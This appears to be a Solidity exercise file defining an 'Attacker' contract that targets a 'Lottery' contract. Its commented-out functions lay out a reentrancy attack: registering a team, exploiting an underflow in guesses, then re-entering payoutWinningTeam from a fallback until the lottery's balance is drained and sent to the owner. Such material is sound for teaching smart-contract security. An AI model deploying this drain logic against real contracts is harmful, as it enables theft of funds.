// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import './Lottery.sol';

contract Attacker {

    Lottery l;
    address  owner;

    event LogFallback();

    constructor(Lottery _l)  {
        l = Lottery(_l);
        owner = msg.sender;
    }

    // // this registers a team with this attacking contracts address, while you
    // // can register on the front-end, the payment has to come from the same
    // // address you want paid back to
    // function register() public payable {
    //     l.registerTeam.value(2 ether)(this, "Attacker Team", "Password01");
    // }

    // // this makes a guess, repeat until correct guess or underflow occurs
    // function guess() public{
    //     l.makeAGuess(this, 1);
    // }

    // // if the team has enough points, causes re-entry into fallback function below
    // function attack() {
    //     l.payoutWinningTeam();
    // }

    // // withdraw balance to owners account
    // function withdraw() {
    //     owner.transfer(this.balance);
    // }

    // // get paid ether, then re-enter the same Lottery function to get paid again
    // // (repeats until Lottery balance is 0)
    // fallback () external payable {
    //     if (msg.sender == address(l)) {
    //         emit LogFallback();
    //         l.payoutWinningTeam();
    //     }
    // }

}
